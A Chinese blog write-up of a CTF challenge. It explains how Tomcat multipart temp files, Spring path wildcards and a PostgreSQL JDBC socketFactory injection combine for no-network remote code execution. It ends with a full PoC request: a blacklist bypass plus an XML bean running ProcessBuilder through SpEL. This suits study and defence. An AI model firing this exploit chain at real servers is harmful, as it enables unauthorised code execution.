---
title: "Tomcat下ClassPathXmlApplicationContext的不出网利用"
onlyTitle: true
date: 2025-4-17 23:09:08
categories:
- java
- other漏洞
tags:
- Tomcat
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg
---



依旧来自p神的Springboot Code-Breaking 2025小挑战https://github.com/phith0n/code-breaking/tree/master/2025

通常spEL可能用到ClassPathXmlApplicationContext去加载外部xml文档，不过这个类是接收一个xml的路径参数，无法直接传XML的文件内容。一般需要写文件，或者出网才能加载xml文档

不过利用中间件的临时文件功能，可以做到不出网加载xml文档

# Tomcat下ClassPathXmlApplicationContext的不出网利用

## Tomcat临时文件

spring boot 项目中，Tomcat 接收到 content-type 为 multipart/form-data 的请求时，需要将接收的文件缓存到临时目录

即使没有上传点，也可以构造一个文件上传的数据包，Tomcat会按照文件上传去处理

```http
POST /jdbc HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: Phpstorm-c886be16=4fe54ddd-bac0-49c8-891f-b23f2d87d891; ajs_anonymous_id=3a831921-66b8-4dec-884b-a812ee4b3458; _ga_13PPZZ7P4Y=GS1.1.1744879212.3.1.1744880220.0.0.0; _ga=GA1.1.335393605.1744707055
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary82BQUgX63J4cIEmr
Content-Length: 141

------WebKitFormBoundary82BQUgX63J4cIEmr
Content-Disposition: form-data; name="key"

[value]
------WebKitFormBoundary82BQUgX63J4cIEmr--

```

在DispatcherServlet.doDispatch方法，调用了checkMultipart方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417200830596.png)

一直跟进到StandardMutipartHttpServletRequest#parseRequest，处理的过程如下：

1. 调用getParts解析http请求
2. 循环解析http请求中的Content-Disposition部分，如果文件名以`=?`开头`?=`结尾，则尝试用MIME进行解码
3. 对结果调用setMultipartFiles

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417202502616.png)

>在代码中，文件名需要解码的情况是当文件名以 =? 开头并且以 ?= 结尾时。这种格式通常表示文件名使用了 MIME 编码（RFC 2047 标准），常见于非 ASCII 字符集的文件名编码场景。
>
>MIME 编码格式：`=?charset?encoding?encoded-text?=`
>charset 是字符集（如 UTF-8、ISO-8859-1）。
>encoding 是编码方式（B 表示 Base64，Q 表示 Quoted-Printable）。
>encoded-text 是实际编码后的文本。
>
>如下面这个Content-Disposition
>
>```http
>Content-Disposition: form-data; name="file"; filename="=?UTF-8?B?5Lit5paH5qWtLnBuZw==?="
>```
>
>文件名以 =? 开头并以 ?= 结尾，符合 MIME 编码格式。charset 是 UTF-8。
>encoding 是 B（Base64 编码）。
>encoded-text 是 5Lit5paH5qWtLnBuZw==。
>使用 Base64 解码 5Lit5paH5qWtLnBuZw==，得到结果为 测试图片.png。

OK，先来看到getParts是怎么解析的，跟进到Request.parseParts，发现parts已经被赋值了，直接return

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417203336526.png)

而这里parts包含了解析后的文件名，一个临时存储的tempFile文件名，和临时文件存储的Tomcat仓库repository

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417203528063.png)

重新在parseParts打上断点，发现题目写的SecurityFilter.getParameters提前触发了parseParts。其实很好理解，因为getParameters需要解析http包，在该方法内就解析multipart/form-data块了。为了避免重复调用就做了一下缓存，导致上面真正的请求到达时直接return。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417203717066.png)

我们来看一下parseParts这个解析http请求的关键函数。首先从ServletContext.TEMPDIR取出了Tomcat的临时文件目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417204007633.png)

然后调用`factory.setRepository(location.getCanonicalFile());`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417212012169.png)

跟进到getCanonicalFile，生成了一个指向tmp路径的file流

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417212129679.png)

然后调用upload.parseRequest，并把结果封装后放到parts里

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417205128278.png)

跟进到upload.parseRequest，先是从`boundary=----WebKitFormBoundary82BQUgX63J4cIEmr`取出文件内容，由于boundary块可能不止一个，所以循环取出。可以看到将取出的文件内容做了一个Stream.copy拷贝到了fileItem内

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417205612326.png)

那文件名是什么？

继续跟进这个fileItem.getOutputStream，getTempFile创建了一个临时的文件名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417212836995.png)

文件名是upload_UID_getUniqueId()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417212937890.png)

其中UID是一个随机数，UniqueId是一个自增的数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417213027714.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417213111384.png)

经过Stream.copy拷贝文件流内容的文件名如下，用Everything能从磁盘中搜到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417205813733.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417205825598.png)

打开后就是上传的文件名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417205858433.png)

无论是是否调用getParamters，都会经过upload.parseRequest创建一个Tomcat临时文件。但是很可惜，在请求结束后该临时文件会被删除

我们将断点打到Controller内，继续查看tmp文件是否存在。很显然，该tmp文件是可以持续到Controller逻辑结束的。所以我们可以在Controller的生命周期利用

但是由于文件名有随机数的不可预测性，理论上来说需要通配符才能进行盲选

## ClassPathXmlApplicationContext的通配符

不管是什么参数，ClassPathXmlApplicationContext最后都会调用到如下的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417211250106.png)

setConfigLocations最终会调用到org.springframework.util.PropertyPlaceholderHelper#parseStringValue

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417222831134.png)

parseStringValue内，如果字符串包括`${`，会进行一个循环解析，具体是调用resolvePlaceholder进行解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417223416415.png)

最后调用到的resolvePlaceholder，很明显，这里是返回环境变量。也就是说parseStringValue是个解析字符串环境变量的过程

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417223513982.png)

分析完setConfigLocations。我们着重关注一下加载远程xml执行spEL表达式的部分，那就是refresh。给一个栈图，直接来看到关键函数getResources

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417220900118.png)

在org.springframework.core.io.support.PathMatchingResourcePatternResolver#getResources中先简单的判断了一下路径是不是`war:`开头，然后调用AntPathMatcher.isPattern。如果返回true则调用findPathMatchingResources

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417220953392.png)

AntPathMatcher.isPattern中对可能出现的通配符符号(`*?`）做了一个匹配，如果有这两个符号，则代表开启通配符模式

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417221115650.png)

跟进到findPathMatchingResources，该方法根据locationPattern查找匹配的资源，解析根目录路径，获取资源列表，并根据不同协议（如bundle、vfs、jar等）调用相应方法处理资源，最后返回匹配的资源数组。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417221541581.png)

因为通配符的存在，所以我们可以考虑用`*?`匹配Tomcat临时的随机文件名。

但是我们看下面这个路径

```http
C:\Users\Administrator\AppData\Local\Temp\tomcat.8080.1334708797896004465\work\Tomcat\localhost\ROOT\upload_cabaf78f_5e01_4a2f_b181_fbeea83ef0dc_00000007.tmp
```

对于不同方式启动的Tomcat，这个临时文件的位置不尽相同。阅读Tomcat代码我们可以发现，这个临时文件所在的位置应该位于Tomcat安装目录下的work目录下。如下

```http
D:\jdk-all\apache-tomcat-8.5.56
```

它的上传路径为

```http
D:\jdk-all\apache-tomcat-8.5.56\temp\xxx.tmp
```

但对于单文件Springboot来说，此时Tomcat是嵌入式的并不存在安装目录，所以此时临时文件将会存储在系统临时目录下的一个子目录中的work目录下，如上面的路径

是否可以写出一个适配所有环境的Payload？

正好，把环境变量用上了。`${catalina.home}`这个环境变量就指向Tomcat的安装目录。`**` 表示任意层级的目录。直接使用这个变量就可以避免环境差异导致的问题

```http
file:/%24%7bcatalina.home%7d/**/*.tmp
```



所以其他漏洞能达到利用Tomcat临时文件RCE的吗？

答案是很难，因为ClassPathXmlApplicationContext通配符的存在，才能读取到本地临时文件。其他漏洞很难存在通配符解析本地文件+RCE

### code-breaking2025 wp

利用postgresql jdbc attack调用任意构造函数，进行上述不出网spEL利用

postgresql jdbc SpEL payload：

```java
jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml
```

但是postgresql jdbc存在黑名单。不允许“jdbc:postgresql”和“socketFactory”同时出现

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417225241736.png)

但是request.getParameter是以`&`分割参数的。假如存在`?url=xxx&a=bbb`，那么getParameter("url")的结果是`xxx`

而@RequestMapping("jdbc")得到的是整个向jdbc路由传输的字符串。&符号前会加`,`作为分隔符。如`?url=xxx&a=bbb`会得到`?url=xxx,&a=bbb`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417225700080.png)

而postgresql多一个垃圾参数并不会影响执行

所以code-breaking2025的poc：

```http
POST /jdbc?url=jdbc:postgresql://1:2/?a=&url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file:/%24%7bcatalina.home%7d/**/*.tmp HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary82BQUgX63J4cIEmr
Content-Length: 141

------WebKitFormBoundary82BQUgX63J4cIEmr
Content-Disposition: form-data; name="key"

<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg name="command" value="calc"/>
        <property name="whatever" value="#{pb.start()}"/>
    </bean>
</beans>
------WebKitFormBoundary82BQUgX63J4cIEmr--
```

注意一定要对后半段url参数中的`&`进行URL编码。不然会被误认为是向jdbc路由传递五个参数。导致postgresql构造函数传的参数为`org.springframework.context.support.ClassPathXmlApplicationContext,`从而报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417230739277.png)

该poc打进后，getParameter("url")的结果是`jdbc:postgresql://1:2/?a=`，而Controller得到的如上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417230048267.png)

近乎转载的文，因为p神写的太好，详略得当。我就多了一些冗余的调试，代表我真的自己复现过吧。



REF:

https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell
